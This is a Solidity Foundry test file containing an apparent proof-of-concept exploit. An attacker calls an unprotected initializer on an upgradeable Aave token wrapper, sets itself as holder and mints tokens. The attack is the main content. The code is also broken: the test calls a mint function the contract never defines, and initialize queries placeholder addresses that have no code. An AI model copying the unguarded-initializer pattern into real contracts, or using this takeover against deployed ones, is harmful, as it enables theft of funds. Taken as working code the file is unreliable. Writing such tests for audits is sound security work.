// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "openzeppelin-contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import "openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function safeTransferFrom(address from, address to, uint256 amount) external;
}

interface IAaveToken {
    function POOL() external view returns (address);
    function UNDERLYING_ASSET_ADDRESS() external view returns (address);
}

interface IAavePool {
    function withdraw(address asset, uint256 amount, address to) external;
}

interface DistributionCreator {
    function distributor() external view returns (address);
    function accessControlManager() external view returns (address);
    function feeRecipient() external view returns (address);
}

contract PullTokenWrapperWithdraw is ERC20Upgradeable, UUPSUpgradeable {
    address public token;
    address public distributionCreator;
    address public holder;
    address public distributor;
    address public accessControlManager;
    address public pool;
    address public underlying;
    address public feeRecipient;

    modifier onlyHolderOrGovernor() {
        require(msg.sender == holder || msg.sender == accessControlManager, "Not allowed");
        _;
    }

    function initialize(
        address _token,
        address _distributionCreator,
        address _holder,
        string memory _name,
        string memory _symbol
    ) public initializer {
        __ERC20_init(string.concat(_name), string.concat(_symbol));
        __UUPSUpgradeable_init();
        require(_holder != address(0), "Zero address");
        IERC20(_token).balanceOf(_holder);
        distributor = DistributionCreator(_distributionCreator).distributor();
        accessControlManager = DistributionCreator(_distributionCreator).accessControlManager();
        token = _token;
        distributionCreator = _distributionCreator;
        holder = _holder;
        pool = IAaveToken(_token).POOL();
        underlying = IAaveToken(_token).UNDERLYING_ASSET_ADDRESS();
        _setFeeRecipient();
    }

    function _setFeeRecipient() internal {
        address _feeRecipient = DistributionCreator(distributionCreator).feeRecipient();
        feeRecipient = _feeRecipient;
    }

    function _authorizeUpgrade(address) internal view override onlyHolderOrGovernor {}
}

contract ExploitTest is Test {
    PullTokenWrapperWithdraw public wrapper;
    address public attacker = address(0xdeadbeef);
    address public token = address(0x1);
    address public distributionCreator = address(0x2);
    address public holder = address(0x3);

    function setUp() public {
        // Deploy the vulnerable contract
        wrapper = new PullTokenWrapperWithdraw();

        // Fund the attacker with some ETH for gas
        vm.deal(attacker, 1 ether);
    }

    function test_exploit() public {
        // Attacker initializes the contract, setting themselves as the holder
        vm.prank(attacker);
        wrapper.initialize(token, distributionCreator, attacker, "ExploitToken", "EXP");

        // Assert that the attacker is now the holder
        assertEq(wrapper.holder(), attacker);

        // Attacker can now mint tokens or perform other privileged actions
        vm.prank(attacker);
        wrapper.mint(1000);

        // Assert that the attacker has received the minted tokens
        assertEq(wrapper.balanceOf(attacker), 1000);
    }
}